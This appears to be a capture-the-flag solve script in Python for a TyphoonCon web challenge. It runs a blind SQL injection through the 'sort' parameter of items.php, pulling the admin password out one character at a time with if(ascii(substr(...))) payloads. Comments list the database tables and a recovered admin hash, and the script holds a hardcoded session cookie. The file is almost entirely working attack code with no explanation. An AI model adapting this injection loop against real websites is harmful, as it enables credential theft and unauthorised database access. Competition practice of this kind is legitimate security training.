import requests, time , string, threading
from urllib.parse import *
session = requests.session()
allowed_string =  ",." + string.ascii_letters + string.digits + ",-_{}!?"

URL = "https://typhooncon-knowme.chals.io:443/items.php?sort="
COOKIES = {"PHPSESSID": "i0hkfjoq75irv0e78t1odg7rj8"}
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-GB,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1"}
PROXIES = {
    "http":"http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080"
    
}
table_name = "items,resetTokens,users"
column_name = "d41d8cd98f00b204e980"

# admin: d41d8cd98f00b204e9800998ecf8427e (rỗng)
# users(id,username,password,email,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS)
# items(id,count,itemName)
# resetTokens(uid,token)
index = 1 + len(column_name)
def db():
    global column_name, index
    while True:
        for c in allowed_string:
            PAYLOAD = f"if(ascii(substr((select password FROM users where username='admin'),{index},1))={ord(c)},count,itemName)"
            resp = session.get(URL+PAYLOAD, headers=HEADERS, cookies=COOKIES)
            if "Labtop" in resp.text:
                print("found: " + c )
                column_name += c
                index += 1
                print("=> Version: " + column_name)
                break 
            else:
                print("failed: " + c)
            

db()            
print("column_name: " + column_name)

